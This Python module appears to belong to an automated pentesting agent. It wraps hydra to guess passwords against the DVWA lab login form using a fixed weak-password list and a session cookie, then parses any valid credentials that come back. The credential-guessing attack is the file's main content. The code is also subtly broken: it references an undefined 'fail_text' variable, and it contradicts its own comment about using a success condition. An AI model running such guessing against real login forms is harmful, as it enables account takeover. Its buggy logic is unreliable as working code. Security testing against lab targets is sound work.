"""hydra wrapper: online password guessing against a web login form, parsed into
structured facts. Mirrors the recon tools' shape (ToolUnavailable + dataclass +
run_*/_parse_* helpers).

NON-DESTRUCTIVE / NOT A DoS. Guesses a SMALL fixed password list (the same
weak-credential list the agent's own probe uses), not a flood — it proves weak
authentication without hammering the service. Read-only: it only submits login
attempts, it changes nothing.

hydra's http-get-form module needs the path, the form body with ^USER^/^PASS^
placeholders, and a FAILURE condition string. For DVWA brute (security=low) the
failure text is "Username and/or password incorrect." and the authenticated
cookie is passed as an extra header. On success hydra prints:

    [80][http-get-form] host: dvwa   login: admin   password: password

The caller enforces scope and supplies the authenticated DVWA cookie. If hydra
is not installed, ToolUnavailable is raised (retryable/skippable by the agent,
exactly like the other tools) so the agent can fall back to its own probe.
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
from dataclasses import dataclass
from urllib.parse import urlsplit

# Small fixed guessing list (NOT a DoS flood). Mirrors the agent's curl probe.
DEFAULT_PASSWORDS = ["password", "admin", "123456", "letmein", "password1"]

# DVWA brute (security=low) SUCCESS marker. hydra's http-get-form order is
# url:params:[optionals]:condition(LAST); a success condition (S=) is more
# reliable than a failure string (which can cause false positives).
DEFAULT_SUCCESS = "Welcome to the password protected area"


class ToolUnavailable(Exception):
    """Raised when the required CLI tool (hydra) is not installed."""


@dataclass
class CredentialFinding:
    username: str
    password: str
    service: str = "http-get-form"

    def as_text(self) -> str:
        return f"valid credentials {self.username}:{self.password} ({self.service})"


def run_hydra_bruteforce(
    target_url: str,
    cookie: str = "",
    username: str = "admin",
    passwords: list[str] | None = None,
    success_text: str = DEFAULT_SUCCESS,
    timeout: int = 180,
) -> list[CredentialFinding]:
    """Run hydra against the DVWA brute-force login form and return any valid
    credentials found. `target_url` points at the form page
    (e.g. http://dvwa/vulnerabilities/brute/). `cookie` is the authenticated
    DVWA cookie. Scope is the caller's responsibility.
    """
    if shutil.which("hydra") is None:
        raise ToolUnavailable("hydra is not installed on this host")

    parts = urlsplit(target_url)
    host = parts.hostname or ""
    port = parts.port or (443 if parts.scheme == "https" else 80)
    path = parts.path or "/"
    if not host:
        raise RuntimeError(f"could not parse host from {target_url!r}")

    words = passwords or DEFAULT_PASSWORDS
    tmp = tempfile.mkdtemp()
    pw_file = os.path.join(tmp, "passwords.txt")
    with open(pw_file, "w", encoding="utf-8") as fh:
        fh.write("\n".join(words) + "\n")

    # http-get-form:  <path>:<body with ^USER^/^PASS^>:<F=failure>[:H=header]
    # colons inside the segments are escaped with "\:" as hydra requires.
    form = f"{path}:username=^USER^&password=^PASS^&Login=Login:F={fail_text}"
    if cookie:
        form += r":H=Cookie\: " + cookie

    cmd = ["hydra", "-l", username, "-P", pw_file, "-s", str(port),
           host, "http-get-form", form]
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, check=False
        )
    except subprocess.TimeoutExpired as exc:
        raise RuntimeError(f"hydra timed out after {timeout}s") from exc

    return _parse_hydra(proc.stdout, service="http-get-form")


# [80][http-get-form] host: dvwa   login: admin   password: password
_HIT_RE = re.compile(r"login:\s*(?P<user>\S+)\s+password:\s*(?P<pass>\S+)")


def _parse_hydra(text: str, service: str = "http-get-form") -> list[CredentialFinding]:
    findings: list[CredentialFinding] = []
    seen: set[tuple[str, str]] = set()
    for m in _HIT_RE.finditer(text):
        key = (m.group("user"), m.group("pass"))
        if key in seen:
            continue
        seen.add(key)
        findings.append(CredentialFinding(username=key[0], password=key[1], service=service))
    return findings
